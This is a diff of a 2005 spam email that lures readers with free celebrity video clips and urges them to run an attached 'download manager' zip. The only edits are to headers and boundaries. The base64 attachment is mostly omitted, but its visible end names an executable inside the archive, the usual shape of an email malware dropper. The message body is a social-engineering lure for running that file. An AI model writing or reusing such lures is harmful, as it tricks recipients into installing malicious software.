@@ -1,19 +1,19 @@
-From: office@netcom.com
+From: webmaster@autoprontaconsegna.com
 Subject: Paris Hilton & Nicole Richie
-Date: Fri, 23 Dec 2005 09:37:25 GMT
-Message-ID: <1cbc.49e048396df@netcom.com>
+Date: Fri, 23 Dec 2005 10:25:17 UTC
+Message-ID: <bf09aac4fad8.1f42@autoprontaconsegna.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===ee988ed7f5958430a8"
+Content-Type: multipart/mixed; boundary="==e1b3cd.877ab07"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: e-user@oss.sgi.com
+To: ralf@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===ee988ed7f5958430a8
+--==e1b3cd.877ab07
 
 The Simple Life:
 
@@ -21,7 +21,7 @@ View Paris Hilton & Nicole Richie video clips , pictures & more ;)
 Download is free until Jan, 2006!
 
 Please use our Download manager.
---===ee988ed7f5958430a8
+--==e1b3cd.877ab07
 Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="downloadm.zip"
@@ -1001,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===ee988ed7f5958430a8--
+--==e1b3cd.877ab07--
